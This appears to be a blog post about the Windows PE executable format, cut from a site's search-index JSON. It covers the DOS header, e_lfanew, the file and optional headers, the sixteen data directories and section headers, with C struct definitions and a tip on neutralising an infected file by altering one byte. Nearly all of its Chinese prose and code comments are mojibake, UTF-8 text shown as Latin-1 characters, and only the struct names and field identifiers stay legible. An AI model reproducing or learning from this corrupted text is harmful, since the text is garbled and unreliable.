å¯¼å‡ºè¡¨ å¯¼å…¥è¡¨ èµ„æºè¡¨ å¼‚å¸¸è¡¨ å±æ€§è¯ä¹¦è¡¨ é‡å®šä½è¡¨ è°ƒè¯•æ•°æ® Architecture Global Ptr çº¿ç¨‹å±€éƒ¨å­˜å‚¨ åŠ è½½é…ç½®è¡¨ ç»‘å®šå¯¼å…¥è¡¨ IAT å»¶æ—¶å¯¼å…¥è¡¨ CLRè¿è¡Œæ—¶å¤´éƒ¨ èŠ‚ä¸»è¦æ˜¯ç”¨æ¥å­˜æ”¾ä¸åŒç±»å‹æ•°æ®(ä»£ç ã€æ•°æ®ã€å¸¸é‡ã€èµ„æºç­‰) ä¸åŒèŠ‚æœ‰ä¸åŒçš„è®¿é—®æƒé™ å¯¹é½æ•°æ®åœ¨å†…å­˜ä¸­çš„å¯¹é½ã€æ•°æ®åœ¨æ–‡ä»¶ä¸­çš„å¯¹é½ã€èµ„æºæ–‡ä»¶ä¸­èµ„æºæ•°æ®çš„å¯¹é½ å†…å­˜å¯¹é½èŠ‚åœ¨å†…å­˜ä¸­çš„å¯¹é½å•ä½å¿…é¡»è‡³å°‘æ˜¯ä¸€ä¸ªé¡µçš„å¤§å° 32ä½ &#x3D; 4kb (1000h) 64ä½&#x3D;8kb (2000h) æ–‡ä»¶å¯¹é½èŠ‚åœ¨æ–‡ä»¶ä¸­çš„å¯¹é½è¦å°äºå†…å­˜ä¸­çš„å¯¹é½ é€šå¸¸ä¼šä»¥ä¸€ä¸ªç‰©ç†æ‰‡åŒºçš„å¤§å°ä½œä¸ºå¯¹é½ç²’åº¦çš„å€¼ä¹Ÿå°±æ˜¯512å­—èŠ‚ åå…­è¿›åˆ¶è¡¨ç¤º (200h) å‡ºäºèŠ‚çº¦èµ„æºçš„è€ƒè™‘ï¼Œæ“ä½œç³»ç»Ÿå…è®¸èŠ‚åœ¨å†…å­˜å’Œæ–‡ä»¶ä¸­çš„å¯¹é½å°ºå¯¸ä¸ä¸€è‡´ã€‚è¿™å°±ç›´æ¥é€ æˆäº†PEåœ¨æ–‡ä»¶ä¸­å’Œåœ¨å†…å­˜ä¸­çš„å¤§å°ä¹Ÿä¼šä¸ä¸€è‡´ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼ŒPEåœ¨å†…å­˜ä¸­çš„å°ºå¯¸è¦æ¯”åœ¨æ–‡ä»¶ä¸­çš„å°ºå¯¸å¤§ã€‚ç”¨æˆ·å¯ä»¥è‡ªå·±å®šä¹‰è¿™äº›å¯¹é½çš„å€¼ã€‚ å¦‚æœå†…å­˜å¯¹é½è¢«å®šä¹‰ä¸ºå°äºæ“ä½œç³»ç»Ÿé¡µçš„å¤§å°ï¼Œåˆ™æ–‡ä»¶å¯¹é½å’Œå†…å­˜å¯¹é½çš„å€¼å¿…é¡»ä¸€è‡´ï¼ èµ„æºæ•°æ®å¯¹é½èµ„æºæ–‡ä»¶ä¸­ï¼Œèµ„æºå­—èŠ‚ç éƒ¨åˆ†ä¸€èˆ¬è¦æ±‚ä»¥åŒå­—ï¼ˆ4ä¸ªå­—èŠ‚ï¼‰æ–¹å¼å¯¹é½ PEæ–‡ä»¶ç»“æ„ åœ¨åå…­ä½ç³»ç»Ÿä¸­ PEå¤´å’ŒPEç»“æ„æ•°æ®è¢«å½“æˆæ˜¯å†—ä½™æ•°æ® åœ¨32ä½ç³»ç»Ÿä¸­ åˆšå¥½ç›¸å å³DOSå¤´æˆä¸ºå†—ä½™æ•°æ® æ‰€è°“å†—ä½™ æ˜¯é’ˆå¯¹DOSå¤´ä¸å‚ä¸ 32ä½ç³»ç»Ÿè¿è¡Œè¿‡ç¨‹è€Œè¨€ å°½ç®¡è¯¥éƒ¨åˆ†ä¸å‚ä¸è¿è¡Œ ä½†ä¹Ÿä¸èƒ½æŠŠè¿™äº›æ•°æ®ä»PEç»“æ„ä¸­å‡ºå» å› ä¸ºDOS MZå¤´ä¸­æœ‰ä¸€ä¸ªå­—æ®µéå¸¸é‡è¦ å³ IMAGE_DOS_HEADER.e_lfanew æ²¡æœ‰ä»–æ“ä½œç³»ç»Ÿå°±å®šä½ä¸åˆ°æ ‡å‡†çš„PEå¤´éƒ¨ å¯æ‰§è¡Œç¨‹åºä¹Ÿå°±ä¼šè¢«æ“ä½œç³»ç»Ÿè®¤ä¸ºæ˜¯éæ³•çš„PEæ˜ åƒ å®šä½æ ‡å‡†PEå¤´ ç”±äºDOS Stubçš„é•¿åº¦ä¸å›ºå®š å¯¼è‡´äº†DOSå¤´ä¹Ÿä¸æ˜¯ä¸€ä¸ªå›ºå®šå¤§å°çš„æ•°æ®ç»“æ„ é‚£ä¹ˆåœ¨WindowsPEä¸­ æ—¢ç„¶æŠŠDOSå¤´æ”¾åœ¨äº†PEçš„èµ·å§‹ä½ç½® å¦‚æœå»å®šä½åé¢çš„æ ‡å‡†PEå¤´æ‰€åœ¨çš„ä½ç½®å‘¢ å­—æ®µe_lfanew å³èµ·è¿™ä¸ªä½œç”¨ è¯¥å­—æ®µçš„å€¼æ˜¯ä¸€ä¸ª ç›¸å¯¹åç§»é‡ ç›¸å¯¹å®šä½æ—¶éœ€è¦åŠ ä¸ŠDOS MZ å¤´çš„åŸºåœ°å€ ä¹Ÿå°±æ˜¯è¯´ é€šè¿‡ä»¥ä¸‹å…¬å¼å¯ä»¥å¾—åˆ°PEå¤´çš„ç»å¯¹ä½ç½® 1PE_start = DOS MZ åŸºåœ°å€ + IMAGE_DOS_HEADER.e_lfanew å¤§æ¦‚åˆ†ä¸ºäº”ä¸ªéƒ¨åˆ† DOS MZå¤´ DOS Stub PEå¤´ èŠ‚è¡¨ èŠ‚å†…å®¹ PEå¤´æ˜¯ç”± IMAGE_FILE_HEADER.SizeOfOptionalHeader æ¥ç¡®å®šå¤§å°çš„ èŠ‚çš„æ•°é‡æ˜¯ç”±å­—æ®µ IMAGE_FILE_HEADER.NumberOfSectionsæ¥å®šä¹‰çš„ DOS Stubå’ŒèŠ‚å†…å®¹éƒ½æ˜¯å¤§å°ä¸ç¡®å®šçš„ èŠ‚çš„å†…å®¹å¤§å°ä¸ç¡®å®š ä¸€ä¸ªæ ‡å‡†çš„PEæ–‡ä»¶ä¸€èˆ¬ç”±å››å¤§éƒ¨åˆ†ç»„æˆ: DOSå¤´ PEå¤´ èŠ‚è¡¨ èŠ‚å†…å®¹ ç´§è·Ÿåœ¨DOS stubåé¢çš„æ˜¯PEå¤´æ ‡è¯† Signature ä¸å¤§éƒ¨åˆ†æ–‡ä»¶æ ¼å¼çš„å¤´éƒ¨ç»“æ„ä¸€æ · PEå¤´éƒ¨ä¿¡æ¯ä¸­æœ‰ä¸€ä¸ªå››å­—èŠ‚çš„æ ‡è¯† è¯¥æ ‡è¯†ä½äºæŒ‡é’ˆIMAGE_DOS_HEADER.e_lfanew æŒ‡å‘çš„ä½ç½® å…¶å†…å®¹å›ºå®š å¯¹åº”äºASCIIç çš„å­—ç¬¦ä¸² â€œPE\\0\\0â€ æ ‡å‡†PEå¤´ IMAGE_FILE_HEADERç´§è·Ÿåœ¨PEå¤´æ ‡è¯†å å³ä½äºIMAGE_DOS_HEADER çš„ e_lfanewå€¼+4çš„ä½ç½® ç”±æ­¤ä½ç½®å¼€å§‹çš„20ä¸ªå­—èŠ‚ä¸ºæ•°æ®ç»“æ„æ ‡å‡†PEå¤´IMAGE_FILE_HEADERçš„å†…å®¹ è¯¥ç»“æ„åœ¨å¾®è½¯çš„å®˜æ–¹æ–‡æ¡£ä¸­è¢«ç§°ä¸ºæ ‡å‡†é€šç”¨å¯¹è±¡æ–‡ä»¶æ ¼å¼ (Common Object File Format COFF)å¤´ å®ƒè®°å½•äº†PEæ–‡ä»¶çš„å…¨å±€å±æ€§ ä¾‹å¦‚ PEæ–‡ä»¶çš„è¿è¡Œå¹³å°ã€PEæ–‡ä»¶ç±»å‹ã€æ–‡ä»¶ä¸­å­˜åœ¨èŠ‚çš„æ€»æ•°ç­‰ å®šä¹‰å¦‚ä¸‹ï¼š 123456789typedef struct _IMAGE_FILE_HEADER &#123; WORD Machine; // å¹³å° WORD NumberOfSections; // peä¸­èŠ‚çš„æ•°é‡ DWORD TimeDateStamp; // æ–‡ä»¶åˆ›å»ºæ—¥æœŸå’Œæ—¶é—´ DWORD PointerToSymbolTable; // æŒ‡å‘ç¬¦å·è¡¨(ç”¨äºè°ƒè¯•) DWORD NumberOfSymbols; // ç¬¦å·è¡¨ä¸­çš„ç¬¦å·æ•°é‡(ç”¨äºè°ƒè¯•) WORD SizeOfOptionalHeader; // æ‰©å±•å¤´ç»“æ„çš„é•¿åº¦ WORD Characteristics; // æ–‡ä»¶å±æ€§&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; è¯¥ç»“æ„å¯ä»¥ç”¨äºåˆ¤æ–­PEæ–‡ä»¶æ˜¯EXEè¿˜æ˜¯DLLç±»å‹ ä¸ä½†å¯ä»¥é€šè¿‡è¯¥ç»“æ„å¾—åˆ°PEæ–‡ä»¶ä¸­èŠ‚çš„æ€»é‡ï¼Œè¿˜å¯ä»¥å½“æˆå¯¹èŠ‚åŒºä¿¡æ¯è¿›è¡Œéå†æ“ä½œæ—¶çš„å¾ªç¯æ¬¡æ•° æ‰©å±•PEå¤´ IMAGE_OPTIONAL_HEADER32123456789101112131415161718192021222324252627282930313233typedef struct _IMAGE_OPTIONAL_HEADER &#123; WORD Magic; // é­”æœ¯å­— BYTE MajorLinkerVersion; // é“¾æ¥å™¨ç‰ˆæœ¬å· BYTE MinorLinkerVersion; // è¿æ¥å™¨æ¬¡ç‰ˆæœ¬å· DWORD SizeOfCode; // æ‰€æœ‰å«ä»£ç çš„èŠ‚çš„æ€»å¤§å° DWORD SizeOfInitializedData; // æ‰€ä»¥å«å·²åˆå§‹åŒ–æ•°æ®çš„èŠ‚çš„æ€»å¤§å° DWORD SizeOfUninitializedData; // æ‰€æœ‰å«æœªåˆå§‹åŒ–æ•°æ®çš„èŠ‚çš„å¤§å° DWORD AddressOfEntryPoint; // ç¨‹åºæ‰§è¡Œå…¥å£ RVA DWORD BaseOfCode; // ä»£ç çš„èŠ‚çš„èµ·å§‹RVA DWORD BaseOfData; // æ•°æ®çš„èŠ‚çš„èµ·å§‹RVA DWORD ImageBase; // ç¨‹åºçš„å»ºè®®è£…è½½åœ°å€ DWORD SectionAlignment; // å†…å­˜ä¸­èŠ‚çš„å¯¹é½ç²’åº¦ DWORD FileAlignment; // æ–‡ä»¶ä¸­èŠ‚çš„å¯¹é½ç²’åº¦ WORD MajorOperatingSystemVersion; // æ“ä½œç³»ç»Ÿçš„ç‰ˆæœ¬å· WORD MinorOperatingSystemVersion; // æ“ä½œç³»ç»Ÿçš„æ¬¡ç‰ˆæœ¬å· WORD MajorImageVersion; // è¯¥PEçš„ç‰ˆæœ¬å· WORD MinorImageVersion; // è¯¥PEçš„æ¬¡ç‰ˆæœ¬å· WORD MajorSubsystemVersion; // æ‰€éœ€å­ç³»ç»Ÿçš„ç‰ˆæœ¬å· WORD MinorSubsystemVersion; // æ‰€éœ€å­ç³»ç»Ÿçš„æ¬¡ç‰ˆæœ¬å· DWORD Win32VersionValue; // æœªç”¨ DWORD SizeOfImage; // å†…å­˜ä¸­æ•´ä¸ªPEæ˜ åƒçš„å°ºå¯¸ DWORD SizeOfHeaders; // æ‰€æœ‰å¤´+èŠ‚è¡¨çš„å¤§å° DWORD CheckSum; // æ ¡éªŒå’Œ WORD Subsystem; // æ–‡ä»¶çš„å­ç³»ç»Ÿ WORD DllCharacteristics; // DLLæ–‡ä»¶ç‰¹å¾ DWORD SizeOfStackReserve; // åˆå§‹åŒ–æ—¶çš„æ ˆå¤§å° DWORD SizeOfStackCommit; // åˆå§‹åŒ–æ—¶å®é™…æäº¤çš„æ ˆå¤§å° DWORD SizeOfHeapReserve; // åˆå§‹åŒ–æ—¶ä¿ç•™çš„å †å¤§å° DWORD SizeOfHeapCommit; // åˆå§‹åŒ–æ—¶å®é™…æäº¤çš„å †å¤§å° DWORD LoaderFlags; // ä¸è°ƒè¯•æœ‰å…³ DWORD NumberOfRvaAndSizes; // ä¸‹é¢çš„æ•°æ®ç›®å½•ç»“æ„çš„é¡¹ç›®æ•°é‡ IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; //æ•°æ®ç›®å½•&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; æ–‡ä»¶æ‰§è¡Œçš„å…¥å£ æ–‡ä»¶è¢«æ“ä½œç³»ç»Ÿè£…å…¥å†…å­˜åçš„é»˜è®¤åŸºåœ°å€ ä»¥åŠèŠ‚åœ¨ç£ç›˜å’Œå†…å­˜ä¸­çš„å¯¹é½å•ä½ç­‰ä¿¡æ¯ å‡å¯åœ¨æ­¤ç»“æ„ä¸­æ‰¾åˆ° å¯¹è¯¥ç»“æ„çš„æŸäº›æ•°å€¼æ”¹åŠ¨éƒ½å¯ä»¥ä¼šé€ æˆPEæ–‡ä»¶çš„åŠ è½½æˆ–è¿è¡Œå¤±è´¥ IMAGE_NT_HEADERSè¿™ä¸ªç»“æ„å¹¿ä¹‰ä¸Šçš„PEå¤´ åœ¨æ ‡å‡†PEæ–‡ä»¶ä¸­å…¶å¤§å°ä¸º456ä¸ªå­—èŠ‚ ä»–æ˜¯ä»¥ä¸Šä¸¤ç§ç»“æ„çš„ç»„å¥½ å³ IMAGE_NT_HEADERS &#x3D; 4ä¸ªå­—èŠ‚çš„PEæ ‡è¯† + IMAGE_FILE_HEADER+IMAGE_OPTIONAL_HEADER32 è¯¥ç»“æ„çš„è¯¦ç»†å®šä¹‰å¦‚ä¸‹ï¼š 12345typedef struct _IMAGE_NT_HEADERS &#123; DWORD Signature; // PEå¤´æ ‡è¯† IMAGE_FILE_HEADER FileHeader; // PEæ ‡å‡†å¤´ IMAGE_OPTIONAL_HEADER32 OptionalHeader; // PEæ‰©å±•å¤´&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; ä¸DOSå¤´ä¸€æ · PEå¤´å¼€å§‹ä¹Ÿæ˜¯ä¸€ä¸ªæ ‡å¿— ç”¨ä¸€ä¸ªåŒå­—çš„ â€œPE\\0\\0â€ æ¥å‘½å è¿™ä¹Ÿæ˜¯PEå¤´çš„ç”±æ¥ æ•°æ®ç›®å½•é¡¹ IMAGE_DATA_DIRECTORYIMAGE_OPTIONAL_HEADER32(æ‰©å±•PEå¤´) ç»“æ„çš„æœ€åä¸€ä¸ªå­—æ®µä¸º DataDriectory è¯¥å­—æ®µå®šä¹‰äº†PEæ–‡ä»¶ä¸­å‡ºç°çš„æ‰€æœ‰ä¸åŒç±»å‹çš„æ•°æ®å’Œç›®å½•ä¿¡æ¯ å¦‚å‰æ‰€è¿° åº”ç”¨ç¨‹åºä¸­çš„æ•°æ®è¢«æŒ‰ç…§ç”¨é€”åˆ†æˆå¾ˆå¤šç§ç±» å¯¼å‡ºè¡¨ã€å¯¼å…¥è¡¨ã€èµ„æºã€é‡å®šä½ç­‰ åœ¨å†…å­˜ä¸­ï¼Œè¿™äº›æ•°æ®è¢«æ“ä½œç³»ç»Ÿä»¥é¡µä¸ºå•ä½ç»„ç»‡èµ·æ¥ï¼Œå¹¶èµ‹äºˆä¸åŒçš„è®¿é—®å±æ€§ï¼Œåœ¨æ–‡ä»¶ä¸­ï¼Œè¿™äº›æ•°æ®ä¹ŸåŒæ ·è¢«ç»„ç»‡èµ·æ¥ï¼ŒæŒ‰ç…§ä¸åŒç±»å‹åˆ†åˆ«å­˜æ”¾åœ¨æ–‡ä»¶çš„æŒ‡å®šä½ç½®ï¼Œè¯¥ç»“æ„å°±æ˜¯ç”¨æ¥æè¿°è¿™äº›ä¸åŒç±»å‹çš„æ•°æ®åœ¨æ–‡ä»¶(å’Œå†…å­˜)ä¸­ä½ç½®åŠå¤§å°çš„ è¯¥æ•°æ®ç›®å½•ä¸­å®šä¹‰çš„æ•°æ®ç±»å‹ä¸€ç›´æ˜¯16ç§ PEç§ä½¿ç”¨äº†ä¸€ç§ç§°ä½œ â€œæ•°æ®ç›®å½•é¡¹ IMAGE_DATA_DIRECTORYâ€ çš„æ•°æ®ç»“æ„æ¥å®šä¹‰æ¯ç§æ•°æ® è¯¥ç»“æ„å¦‚ä¸‹æ‰€ç¤º åªæœ‰ä¸¤ä¸ªå­—æ®µ 1234typedef struct _IMAGE_DATA_DIRECTORY &#123; DWORD VirtualAddress; // æ•°æ®çš„èµ·å§‹ RVA DWORD Size; // æ•°æ®å—çš„é•¿åº¦&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; æ€»çš„æ•°æ®ç›®å½•ä¸€å…±ç”±16ä¸ªç›¸åŒçš„ IMAGE_DATA_DIRECTORY ç»“æ„è¿ç»­æ’åˆ—åœ¨ä¸€èµ·ç»„æˆ ç´¢å¼• åç§° è¯´æ˜ 0 Export Table å¯¼å‡ºè¡¨ï¼ˆç¨‹åºå¯¼å‡ºçš„å‡½æ•°ä¿¡æ¯ï¼‰ 1 Import Table å¯¼å…¥è¡¨ï¼ˆç¨‹åºå¯¼å…¥çš„ DLL å’Œå‡½æ•°ï¼‰ 2 Resource Table èµ„æºè¡¨ï¼ˆå›¾æ ‡ã€å¯¹è¯æ¡†ã€å­—ç¬¦ä¸²ç­‰ï¼‰ 3 Exception Table å¼‚å¸¸å¤„ç†è¡¨ï¼ˆSEHï¼‰ 4 Certificate Table æ•°å­—ç­¾åè¯ä¹¦è¡¨ 5 Base Relocation é‡å®šä½è¡¨ï¼ˆAddress Fixupsï¼‰ 6 Debug Directory è°ƒè¯•ä¿¡æ¯è¡¨ï¼ˆç¬¦å·ç­‰ï¼‰ 7 Architecture ä¿ç•™ï¼ˆæœªä½¿ç”¨ï¼‰ 8 GlobalPtr å…¨å±€æŒ‡é’ˆï¼ˆMIPSï¼‰ 9 TLS Table TLS åˆå§‹åŒ–æ•°æ®è¡¨ï¼ˆçº¿ç¨‹æœ¬åœ°å­˜å‚¨ï¼‰ 10 Load Config Table åŠ è½½é…ç½®è¡¨ï¼ˆå®‰å…¨è®¾ç½®ç­‰ï¼‰ 11 Bound Import ç»‘å®šå¯¼å…¥è¡¨ï¼ˆæå‰ç»‘å®šä¿¡æ¯ï¼‰ 12 IAT å¯¼å…¥åœ°å€è¡¨ï¼ˆImport Address Tableï¼‰ 13 Delay Import å»¶è¿Ÿå¯¼å…¥è¡¨ï¼ˆå»¶è¿ŸåŠ è½½ DLLï¼‰ 14 COM Descriptor CLR è¿è¡Œæ—¶å¤´ï¼ˆæ‰˜ç®¡ç¨‹åºï¼‰ 15 Reserved ä¿ç•™ 1234567IMAGE_OPTIONAL_HEADERâ”œâ”€â”€ ...â”œâ”€â”€ IMAGE_DATA_DIRECTORY DataDirectory[16]â”‚ â”œâ”€â”€ DataDirectory[0] â†’ Export Tableâ”‚ â”œâ”€â”€ DataDirectory[1] â†’ Import Tableâ”‚ â”œâ”€â”€ DataDirectory[2] â†’ Resource Tableâ”‚ â””â”€â”€ ... å¸¸ç”¨çš„æ•°æ®ç›®å½•çš„ç”¨é€”å¦‚ä¸‹ï¼š æ•°æ®ç›®å½•é¡¹ ä½œç”¨ å¯¼å…¥è¡¨ æ‰¾åˆ°ç¨‹åºä¾èµ–çš„ DLL å’Œå‡½æ•° å¯¼å‡ºè¡¨ æä¾›å¤–éƒ¨è°ƒç”¨å‡½æ•°çš„ä¿¡æ¯ï¼ˆå¦‚ DLL å¯¼å‡ºå‡½æ•°ï¼‰ èµ„æºè¡¨ ç¨‹åºå›¾æ ‡ã€å¯¹è¯æ¡†ç­‰ GUI å…ƒç´  é‡å®šä½è¡¨ å¯æ‰§è¡Œæ–‡ä»¶åœ¨åŠ è½½æ—¶ä¿®æ­£åœ°å€ TLS è¡¨ å¤šçº¿ç¨‹æ”¯æŒçš„çº¿ç¨‹æœ¬åœ°å˜é‡æ•°æ® COM æè¿°ç¬¦ .NET ç¨‹åºçš„å…¥å£ç‚¹ï¼ˆæ‰˜ç®¡ç¨‹åºï¼‰ å¦‚æœæƒ³åœ¨PEæ–‡ä»¶ç§å¯»æ‰¾ç‰¹å®šç±»å‹çš„æ•°æ® å°±éœ€è¦ä»è¯¥ç»“æ„å¼€å§‹ è¯¥ç»“æ„æ¯ä¸ªå­—æ®µåçš„åç§»éƒ½æ˜¯åŸºäº IMAGE_NT_HEADERS å¤´çš„ èŠ‚è¡¨é¡¹ IMAGE_SECTION_HEADER123456789101112131415typedef struct _IMAGE_SECTION_HEADER &#123; BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; // 8ä¸ªå­—èŠ‚èŠ‚å union &#123; DWORD PhysicalAddress; DWORD VirtualSize; // èŠ‚åŒºçš„å°ºå¯¸ &#125; Misc; DWORD VirtualAddress; // èŠ‚åŒºçš„RVAåœ°å€ DWORD SizeOfRawData; // åœ¨æ–‡ä»¶ä¸­å¯¹é½åçš„å°ºå¯¸ DWORD PointerToRawData; // åœ¨æ–‡ä»¶ä¸­çš„åç§» DWORD PointerToRelocations; // åœ¨OBJæ–‡ä»¶ä¸­ä½¿ç”¨ DWORD PointerToLinenumbers; // è¡Œå·è¡¨çš„ä½ç½®(ä¾›è°ƒè¯•ä½¿ç”¨) WORD NumberOfRelocations; // åœ¨OBJæ–‡ä»¶ä¸­ä½¿ç”¨ WORD NumberOfLinenumbers; // è¡Œå·è¡¨ä¸­è¡Œå·çš„æ•°é‡ DWORD Characteristics; // èŠ‚çš„å±æ€§&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; è¯¥åç§»æ˜¯åŸºäº IMAGE_SECTION_HEADER å¤´çš„ PEå¤´ IMAGE_NT_HEADER å­—æ®µ Signature åŒå­— PEæ–‡ä»¶æ ‡è¯† è¢«å®šä¹‰ä¸º 4550h ä¹Ÿå°±æ˜¯ PE å†åŠ ä¸Šä¸¤ä¸ª00 è¿™å°±æ˜¯PEè¿™ä¸ªç§°å‘¼çš„ç”± å¦‚æœæ›´æ”¹å…¶ä¸­çš„ä»»ä½•ä¸€ä¸ªå­—èŠ‚æ“ä½œç³»ç»Ÿå°±æ— æ³•æŠŠè¯¥æ–‡ä»¶è¯†åˆ«ä¸ºæ­£ç¡®çš„PEæ–‡ä»¶ é€šè¿‡ä¿®æ”¹è¿™ä¸ªå­—æ®µ ä¼šå¯¼è‡´PEæ–‡ä»¶åœ¨32ä¸ºç³»ç»Ÿä¸­åŠ è½½å¤±è´¥ ä½†ç”±äºæ–‡ä»¶çš„å…¶ä»–éƒ¨åˆ†(ç‰¹åˆ«æ˜¯DOSå¤´)å¹¶æ²¡æœ‰è¢«ç ´å ç³»ç»Ÿè¿˜æ˜¯å¯ä»¥è¯†åˆ«å‡ºå…¶ä¸ºDOSç³»ç»Ÿä¸‹çš„å¯æ‰§è¡Œç¨‹åº å¹¶é€šè¿‡è°ƒç”¨çº¯DOSç¯å¢ƒæ¥è¿è¡Œ DOS stubä¸­çš„ç¨‹åºä»£ç  å¦‚æœä½ ç¡®è®¤æ“ä½œç³»ç»Ÿä¸­æŸä¸ªPEæ–‡ä»¶æºå¸¦ç—…æ¯’ å¹¶ä¸”å¼€æœºä¼šè¢«åŠ è½½åˆ°å†…å­˜è¿è¡Œ æœ€ç®€å•çš„å¤„ç†åŠæ³•æ˜¯é€šè¿‡WINDOWS PEç›˜å¯åŠ¨ç³»ç»Ÿ åœ¨ç³»ç»Ÿä¸­æ‰¾åˆ°ç—…æ¯’æ–‡ä»¶ ä½¿ç”¨è®°äº‹æœ¬ç®€å•åœ°ä¿®æ”¹å…¶ä¸­ä»»ä½•ä¸€ä¸ªå­—ç¬¦ ä¿å­˜æ–‡ä»¶ é‡æ–°å¼€æœºå¯åŠ¨åå³å¯é˜²æ­¢ç—…æ¯’æ–‡ä»¶è¢«åŠ è½½ æ­¤PEéå½¼PE windows PEæ˜¯ä¸€ä¸ªæ“ä½œç³»ç»Ÿ å…¶å…¨ç§°æ˜¯ Windows Perinstallation Environment å³ Windowsçš„é¢„å®‰è£…ç¯å¢ƒ è¯¥æ“ä½œç³»ç»ŸåŒºåˆ«äº Windows XP&#x2F;2000&#x2F;Vista ç­‰ å¯ä»¥ä»å…‰ç›˜å¼•å¯¼","categories":[],"tags":[{"name":"PE","slug":"PE","permalink":"http://example.com/tags/PE/"}]}],"categories":[],"tags":[{"name":"docker","slug":"docker","permalink":"http://example.com/tags/docker/"},{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"},{"name":"å‡¯æ’’å¯†ç ","slug":"å‡¯æ’’å¯†ç ","permalink":"http://example.com/tags/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81/"},{"name":"ç¼–ç ","slug":"ç¼–ç ","permalink":"http://example.com/tags/%E7%BC%96%E7%A0%81/"},{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"PE","slug":"PE","permalink":"http://example.com/tags/PE/"}]}